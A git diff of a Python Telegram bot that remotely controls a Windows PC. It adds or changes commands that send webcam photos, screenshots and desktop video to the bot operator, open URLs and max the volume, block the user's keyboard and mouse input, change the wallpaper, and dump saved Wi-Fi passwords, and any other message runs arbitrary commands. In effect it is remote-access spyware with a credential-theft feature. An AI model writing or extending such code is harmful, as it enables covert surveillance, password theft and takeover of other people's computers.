@@ -1,6 +1,6 @@
+import os
 import pyautogui
 import speech_recognition as sr
-from pc_controller.sound import Sound
 import pyscreenshot
 from aiogram import Bot, types
 from aiogram.dispatcher import Dispatcher
@@ -8,7 +8,10 @@ from aiogram.types import ContentType
 from aiogram.utils import executor
 from config.config import TOKEN
 
+from time import sleep
+
 from pc_remouter import RemoteManager
+from pc_controller.sound import Sound
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
@@ -70,6 +73,8 @@ async def send_screenshot(msg: types.Message):
 
     await bot.send_photo(msg.from_user.id, types.InputFile('screen.png'))
 
+    os.remove("screen.png")
+
 
 @dp.message_handler(commands=['cam'])
 async def send_cam(msg: types.Message):
@@ -77,13 +82,28 @@ async def send_cam(msg: types.Message):
 
     await bot.send_photo(msg.from_user.id, types.InputFile('screen_camera.png'))
 
+    os.remove("screen_camera.png")
 
-@dp.message_handler(commands=['o'])
-async def get_video(msg: types.Message):
-    # await rm.make_cam_video()
 
-    # await msg.answer_video(open('video.avi', 'rb'))
-    await msg.answer('1')
+@dp.message_handler(commands=['webvideo'])
+async def video_from_webcam(message: types.Message):
+    video_bytes = rm.make_desktop_video()
+    await bot.send_message(message.from_user.id, 'Приятного просмотра!')
+    await bot.send_video(message.from_user.id, video=video_bytes)
+
+    os.remove("webvideo.avi")
+
+
+@dp.message_handler(commands=['meme'])
+async def open_mem(msg: types.Message):
+    rm.open_url()
+    sleep(3)
+    Sound.volume_max()
+
+
+@dp.message_handler(commands=['openurl'])
+async def open_mem(msg: types.Message):
+    rm.open_url(msg.text.split()[1])
 
 
 @dp.message_handler(commands='s')
@@ -96,9 +116,14 @@ async def mouse_left_click(msg: types.Message):
     pyautogui.click()
 
 
-@dp.message_handler(commands='w')
+@dp.message_handler(commands='block')
 async def write(msg: types.Message):
-    pyautogui.typewrite(msg.text.split()[1])
+    rm.blockinput()
+
+
+@dp.message_handler(commands='unblock')
+async def write(msg: types.Message):
+    rm.blockinput_stop()
 
 
 @dp.message_handler(commands='v')
@@ -115,42 +140,30 @@ async def voice_say(msg: types.Message):
     voice = msg.voice
     await voice.download()
 
-    # path = rm.execute_command_console('cd')
-    # path = path[:len(path) - 1:]
-    #
-    # path += '\\' + 'voice.mp3'
-
     await voice.download(destination_file=r'voice/voice.wav')
 
-    # rate = 22050  # samples per second
-    # T = 3  # sample duration (seconds)
-    # f = 440.0  # sound frequency (Hz)
-    # t = np.linspace(0, T, T * rate, endpoint=False)
-    # x = np.sin(2 * np.pi * f * t)
-    #
-    # wavio.write('voice.wav', x, rate, sampwidth=2)
-
-    # from scipy.io import wavfile
-    #
-    # samplerate = 44100
-    # fs = 100
-    # t = np.linspace(0., 1., samplerate)
-    # amplitude = np.iinfo(np.int16).max
-    # data = amplitude * np.sin(2. * np.pi * fs * t)
-    #
-    # y = (np.iinfo(np.int32).max * (data / np.abs(data).max())).astype(np.int32)
-    #
-    # wavfile.write("1.wav", samplerate, y)
-
     r = sr.Recognizer()
-    with sr.AudioFile('voice/file_16.oga') as source:
+    with sr.AudioFile('voice/voice.wav') as source:
         audio = r.record(source)
+        print('success')
 
     print(r.recognize_google(audio, language='ru-RU'))
 
 
+@dp.message_handler(commands=["change"], commands_prefix="/", commands_ignore_caption=False, content_types=["photo"])
+async def change_desktop_wallpapers(msg: types.Message):
+    await msg.photo[-1].download('C:/img/img.jpg')
+    rm.change_background(r'C:/img/img.jpg')
+
+
+@dp.message_handler(commands=["wifi"], commands_prefix="/", commands_ignore_caption=False)
+async def get_passwords(msg: types.Message):
+    await send_message(bot, msg.from_user.id, rm.get_passwords())
+
+
 @dp.message_handler()
 async def echo_message(msg: types.Message):
+    print(msg.text)
     command = str(msg.text).split()
     result = rm.execute(command)
 
@@ -174,4 +187,8 @@ async def upload(message: types.Message):
 
 
 if __name__ == '__main__':
-    executor.start_polling(dp)
+    try:
+        while True:
+            executor.start_polling(dp)
+    except:
+        print('ошибка')
